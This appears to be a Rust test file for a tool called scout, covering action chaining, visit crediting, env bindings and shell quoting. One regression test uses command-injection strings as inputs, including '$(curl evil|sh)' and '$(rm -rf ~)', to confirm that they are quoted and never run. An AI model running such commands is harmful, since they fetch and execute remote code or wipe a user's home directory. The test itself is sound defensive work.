//! Engineers — executor semantics: chain policy, env landing, visit
//! credit + rate limit (ADR-001 §Visit credit, ADR-004 §5).

use std::collections::HashMap;
use std::fs;
use std::path::PathBuf;

use rusqlite::Connection;
use scout::actions::{execute, ActionCtx};
use scout::config::template::{ExpandCtx, ExpandError, Template};
use scout::config::{Action, OnFailure, Step};

fn temp_dir(tag: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!(
        "scout-exec-{tag}-{}-{}",
        std::process::id(),
        std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()
    ));
    fs::create_dir_all(&dir).unwrap();
    dir
}

fn t(raw: &str) -> Template {
    Template::parse(raw).unwrap()
}

fn spawn_step(argv: &[&str]) -> Step {
    Step::Spawn { argv: argv.iter().map(|a| t(a)).collect(), wait: true, cwd: None }
}

fn action(name: &str, on_failure: OnFailure, steps: Vec<Step>) -> Action {
    Action {
        name: name.into(),
        description: String::new(),
        keybinding: None,
        on_failure,
        unsafe_shell_template: false,
        steps,
        from_user_config: true,
    }
}

fn ctx(path: PathBuf) -> ActionCtx {
    ActionCtx { path, query: String::new(), home: std::env::var("HOME").unwrap() }
}

fn seeded_db(dir: &std::path::Path) -> (Connection, i64) {
    // The real open path registers exp() when the bundled SQLite lacks
    // math built-ins; visit credit depends on it.
    let conn = scout::index::pragma::open(&dir.join("index.db")).unwrap();
    conn.execute(
        "INSERT INTO paths (path, scan_generation) VALUES (:p, 1)",
        rusqlite::named_params! { ":p": dir.display().to_string() },
    )
    .unwrap();
    let id = conn.last_insert_rowid();
    (conn, id)
}

fn visits(conn: &Connection, id: i64) -> i64 {
    conn.query_row(
        "SELECT visits_total FROM paths WHERE rowid = :id",
        rusqlite::named_params! { ":id": id },
        |r| r.get(0),
    )
    .unwrap()
}

#[test]
fn abort_on_first_failure_no_credit() {
    let dir = temp_dir("abort");
    let (conn, id) = seeded_db(&dir);

    let a = action(
        "fails-first",
        OnFailure::Abort,
        vec![spawn_step(&["false"]), spawn_step(&["true"])],
    );
    let outcome = execute(&a, &ctx(dir.clone()), Some((&conn, id)));
    assert!(!outcome.any_success);
    assert!(!outcome.credited);
    assert_eq!(outcome.steps_run, 1, "abort must stop the chain");
    assert_eq!(outcome.exit_code, 1, "first failing step's exit code");
    assert_eq!(visits(&conn, id), 0, "credit suppressed when the first step fails");

    fs::remove_dir_all(&dir).unwrap();
}

#[test]
fn first_success_credits_even_when_later_step_aborts() {
    let dir = temp_dir("credit");
    let (conn, id) = seeded_db(&dir);

    let a = action(
        "succeeds-then-fails",
        OnFailure::Abort,
        vec![spawn_step(&["true"]), spawn_step(&["false"])],
    );
    let outcome = execute(&a, &ctx(dir.clone()), Some((&conn, id)));
    assert!(outcome.any_success);
    assert!(outcome.credited, "credit granted on first success is not retracted by a later abort");
    assert_eq!(outcome.exit_code, 0, "any success → exit 0");
    assert_eq!(visits(&conn, id), 1);

    fs::remove_dir_all(&dir).unwrap();
}

#[test]
fn rate_limit_one_credit_per_window() {
    let dir = temp_dir("ratelimit");
    let (conn, id) = seeded_db(&dir);

    let a = action("ok", OnFailure::Abort, vec![spawn_step(&["true"])]);
    let first = execute(&a, &ctx(dir.clone()), Some((&conn, id)));
    let second = execute(&a, &ctx(dir.clone()), Some((&conn, id)));
    assert!(first.credited);
    assert!(!second.credited, "double-Enter within 10 s must not compound");
    assert_eq!(visits(&conn, id), 1);

    fs::remove_dir_all(&dir).unwrap();
}

#[test]
fn continue_runs_all_steps_exit_2_when_none_succeed() {
    let dir = temp_dir("continue");
    let (conn, id) = seeded_db(&dir);

    let a = action(
        "all-fail",
        OnFailure::Continue,
        vec![spawn_step(&["false"]), spawn_step(&["false"])],
    );
    let outcome = execute(&a, &ctx(dir.clone()), Some((&conn, id)));
    assert!(!outcome.any_success);
    assert_eq!(outcome.steps_run, 2, "continue must run the whole chain");
    assert_eq!(outcome.exit_code, 2, "SCOUT-defined 2 when every step failed under continue");
    assert_eq!(visits(&conn, id), 0);

    fs::remove_dir_all(&dir).unwrap();
}

#[test]
fn failed_env_step_lands_nothing_and_later_reference_aborts() {
    let dir = temp_dir("env");
    let (conn, id) = seeded_db(&dir);

    // Step 1 sets GOOD and also references an undefined env var → the
    // step fails and NONE of its bindings land (all-or-nothing).
    // Step 2 references GOOD → undefined_env, not empty expansion.
    let a = action(
        "env-chain",
        OnFailure::Continue,
        vec![
            Step::Env {
                set: vec![
                    ("GOOD".into(), t("value")),
                    ("BAD".into(), t("{env.SCOUT_TEST_UNDEFINED_VAR}")),
                ],
            },
            Step::Spawn { argv: vec![t("printenv"), t("{env.GOOD}")], wait: true, cwd: None },
        ],
    );
    let outcome = execute(&a, &ctx(dir.clone()), Some((&conn, id)));
    assert!(!outcome.any_success, "no step may succeed");
    assert_eq!(outcome.steps_run, 2);
    assert_eq!(visits(&conn, id), 0);

    fs::remove_dir_all(&dir).unwrap();
}

#[test]
fn env_overlay_reaches_spawned_children() {
    let dir = temp_dir("overlay");
    let marker = dir.join("marker");

    // sh -c without placeholders needs no attestation; it reads the
    // env-step binding and writes it to a file we can assert on.
    let script = format!("printf '%s' \"$SCOUT_TEST_VALUE\" > {}", marker.display());
    let a = action(
        "env-to-child",
        OnFailure::Abort,
        vec![
            Step::Env { set: vec![("SCOUT_TEST_VALUE".into(), t("from-scout"))] },
            Step::Spawn { argv: vec![t("sh"), t("-c"), t(&script)], wait: true, cwd: None },
        ],
    );
    let outcome = execute(&a, &ctx(dir.clone()), None);
    assert!(outcome.any_success);
    assert_eq!(fs::read_to_string(&marker).unwrap(), "from-scout");

    fs::remove_dir_all(&dir).unwrap();
}

#[test]
fn print_seam_quotes_and_refuses_hazardous_paths() {
    let env = HashMap::new();
    let path = PathBuf::from("/tmp/it's a dir");
    let ctx = ExpandCtx { path: &path, query: "q", home: "/home/u", env: &env };

    let quoted = t("cd {path}").expand(&ctx, true).unwrap();
    assert_eq!(quoted, "cd '/tmp/it'\\''s a dir'");

    // Argv seam does NOT quote (execvp gets the literal bytes).
    let unquoted = t("{path}").expand(&ctx, false).unwrap();
    assert_eq!(unquoted, "/tmp/it's a dir");

    let evil = PathBuf::from("/tmp/evil\nname");
    let ctx = ExpandCtx { path: &evil, query: "", home: "/home/u", env: &env };
    assert_eq!(t("{path}").expand(&ctx, true).unwrap_err(), ExpandError::HazardousPath);
}

#[test]
fn print_seam_quotes_every_placeholder_not_just_paths() {
    // Regression: an attacker-influenced filename / query / env value
    // must not reach the wrapper's eval unquoted (ADR-003 §2 / ADR-004
    // §3, revised 2026-07-06 — shadow-review finding).
    let mut env = HashMap::new();
    env.insert("EVIL".to_string(), "$(rm -rf ~)".to_string());
    let path = PathBuf::from("/tmp/$(curl evil|sh)");
    let ctx = ExpandCtx { path: &path, query: "`whoami`", home: "/home/u", env: &env };

    // {name} — basename can hold shell metacharacters.
    assert_eq!(t("echo {name}").expand(&ctx, true).unwrap(), "echo '$(curl evil|sh)'");
    // {query} — literally user-typed.
    assert_eq!(t("grep {query}").expand(&ctx, true).unwrap(), "grep '`whoami`'");
    // {env.*} — data, never a command at this seam.
    assert_eq!(t("run {env.EVIL}").expand(&ctx, true).unwrap(), "run '$(rm -rf ~)'");

    // Newline in a non-path placeholder is equally hazardous.
    let mut env2 = HashMap::new();
    env2.insert("NL".to_string(), "a\nb".to_string());
    let ctx2 = ExpandCtx { path: &path, query: "", home: "/h", env: &env2 };
    assert_eq!(t("x {env.NL}").expand(&ctx2, true).unwrap_err(), ExpandError::HazardousPath);
}

#[test]
fn undefined_query_is_valid_empty_but_env_is_not() {
    let env = HashMap::new();
    let path = PathBuf::from("/tmp");
    let ctx = ExpandCtx { path: &path, query: "", home: "/h", env: &env };
    assert_eq!(t("q={query}").expand(&ctx, false).unwrap(), "q=");
    assert!(matches!(t("{env.NOPE}").expand(&ctx, false), Err(ExpandError::UndefinedEnv(_))));
}

#[test]
fn repo_root_resolves_through_git_file_or_dir() {
    let dir = temp_dir("reporoot");
    let repo = dir.join("repo");
    let nested = repo.join("a/b");
    fs::create_dir_all(&nested).unwrap();
    fs::create_dir(repo.join(".git")).unwrap();

    let env = HashMap::new();
    let ctx = ExpandCtx { path: &nested, query: "", home: "/h", env: &env };
    assert_eq!(t("{repo_root}").expand(&ctx, false).unwrap(), repo.display().to_string());

    // Worktree-style .git FILE also counts.
    let wt = dir.join("worktree");
    fs::create_dir_all(&wt).unwrap();
    fs::write(wt.join(".git"), "gitdir: elsewhere\n").unwrap();
    let ctx = ExpandCtx { path: &wt, query: "", home: "/h", env: &env };
    assert_eq!(t("{repo_root}").expand(&ctx, false).unwrap(), wt.display().to_string());

    // No .git anywhere under temp root → undefined, aborts.
    let bare = temp_dir("bare");
    let ctx = ExpandCtx { path: &bare, query: "", home: "/h", env: &env };
    assert!(matches!(
        t("{repo_root}").expand(&ctx, false),
        Err(ExpandError::UndefinedPlaceholder(_))
    ));

    fs::remove_dir_all(&dir).unwrap();
    fs::remove_dir_all(&bare).unwrap();
}

/// The reason a step failed used to exist only as a log line, written
/// in picker mode, so a user whose action silently did nothing had no
/// way to reach it. `ExecOutcome` carries it out so the caller can say
/// what happened.
#[test]
fn exec_outcome_carries_the_failure_reason() {
    let dir = temp_dir("failreason");
    let target = dir.join("not-a-repo");
    fs::create_dir_all(&target).unwrap();

    let action = Action {
        name: "status".into(),
        description: String::new(),
        keybinding: None,
        on_failure: OnFailure::Abort,
        unsafe_shell_template: false,
        steps: vec![Step::Print { format: Template::parse("cd {repo_root}").unwrap() }],
        from_user_config: true,
    };
    let ctx =
        ActionCtx { path: target.clone(), query: String::new(), home: dir.display().to_string() };

    let outcome = execute(&action, &ctx, None);
    assert!(!outcome.any_success);
    let (step, reason) = outcome.failure.expect("a failed action must report why");
    assert_eq!(step, 0, "first step failed");
    assert!(reason.contains("repo_root"), "reason names the placeholder: {reason}");

    fs::remove_dir_all(&dir).unwrap();
}

// ---------------------------------------------------------------------
// {env.NAME} scope (ADR-003 §129): template bindings are what an `env`
// step set, never what the user happened to export.
// ---------------------------------------------------------------------

/// The substitution the threat model refuses: a reference resolving to
/// an inherited variable of the same name. Previously `{env.SCOUT_TEST_*}`
/// silently picked this up from the process environment.
#[test]
fn env_placeholder_does_not_fall_back_to_the_inherited_environment() {
    // PATH is always set in the parent environment, so this needs no
    // mutation of it. Tests that call `std::env::set_var` race every
    // sibling test reading `std::env::vars()` on another thread.
    let dir = temp_dir("env-nofallback");

    let action = Action {
        name: "leak".into(),
        description: String::new(),
        keybinding: None,
        on_failure: OnFailure::Abort,
        unsafe_shell_template: false,
        steps: vec![Step::Print { format: Template::parse("printf '%s' {env.PATH}").unwrap() }],
        from_user_config: true,
    };
    let ctx =
        ActionCtx { path: dir.clone(), query: String::new(), home: dir.display().to_string() };

    let outcome = execute(&action, &ctx, None);
    assert!(!outcome.any_success, "the reference must not resolve");
    let (_, reason) = outcome.failure.expect("a reason");
    assert!(reason.contains("undefined_env"), "{reason}");
    assert!(reason.contains("PATH"), "{reason}");

    fs::remove_dir_all(&dir).unwrap();
}

/// The legitimate case still works: a binding set by an earlier step in
/// the same action is visible to a later one.
#[test]
fn env_placeholder_resolves_a_binding_set_by_an_earlier_step() {
    let dir = temp_dir("env-binding");
    let action = Action {
        name: "chain".into(),
        description: String::new(),
        keybinding: None,
        on_failure: OnFailure::Abort,
        unsafe_shell_template: false,
        steps: vec![
            Step::Env { set: vec![("SCOUT_STEP_SET".into(), Template::parse("{name}").unwrap())] },
            Step::Print { format: Template::parse("printf '%s' {env.SCOUT_STEP_SET}").unwrap() },
        ],
        from_user_config: true,
    };
    let ctx =
        ActionCtx { path: dir.clone(), query: String::new(), home: dir.display().to_string() };

    let outcome = execute(&action, &ctx, None);
    assert!(outcome.any_success, "failure: {:?}", outcome.failure);
    fs::remove_dir_all(&dir).unwrap();
}

/// A spawned child must still inherit a usable environment — the split
/// restricts what `{env.NAME}` sees, not what a process receives.
#[test]
fn a_spawned_child_still_inherits_the_process_environment() {
    let dir = temp_dir("env-child");
    let marker = dir.join("saw-path");
    // `sh -c` needs PATH to find anything; writing the file proves the
    // child got a working environment.
    let action = Action {
        name: "spawn".into(),
        description: String::new(),
        keybinding: None,
        on_failure: OnFailure::Abort,
        unsafe_shell_template: false,
        steps: vec![Step::Spawn {
            argv: vec![
                Template::parse("/bin/sh").unwrap(),
                Template::parse("-c").unwrap(),
                Template::parse(&format!("test -n \"$PATH\" && touch {}", marker.display()))
                    .unwrap(),
            ],
            wait: true,
            cwd: None,
        }],
        from_user_config: true,
    };
    let ctx =
        ActionCtx { path: dir.clone(), query: String::new(), home: dir.display().to_string() };

    let outcome = execute(&action, &ctx, None);
    assert!(outcome.any_success, "failure: {:?}", outcome.failure);
    assert!(marker.exists(), "child did not see PATH");
    fs::remove_dir_all(&dir).unwrap();
}

/// An `env` step's value is exported to later children as well as being
/// visible to later templates.
#[test]
fn an_env_step_exports_to_later_children() {
    let dir = temp_dir("env-export");
    let marker = dir.join("exported");
    let action = Action {
        name: "export".into(),
        description: String::new(),
        keybinding: None,
        on_failure: OnFailure::Abort,
        unsafe_shell_template: false,
        steps: vec![
            Step::Env { set: vec![("SCOUT_EXPORTED".into(), Template::parse("{name}").unwrap())] },
            Step::Spawn {
                argv: vec![
                    Template::parse("/bin/sh").unwrap(),
                    Template::parse("-c").unwrap(),
                    Template::parse(&format!(
                        "test -n \"$SCOUT_EXPORTED\" && touch {}",
                        marker.display()
                    ))
                    .unwrap(),
                ],
                wait: true,
                cwd: None,
            },
        ],
        from_user_config: true,
    };
    let ctx =
        ActionCtx { path: dir.clone(), query: String::new(), home: dir.display().to_string() };

    let outcome = execute(&action, &ctx, None);
    assert!(outcome.any_success, "failure: {:?}", outcome.failure);
    assert!(marker.exists(), "the env step did not reach the child");
    fs::remove_dir_all(&dir).unwrap();
}
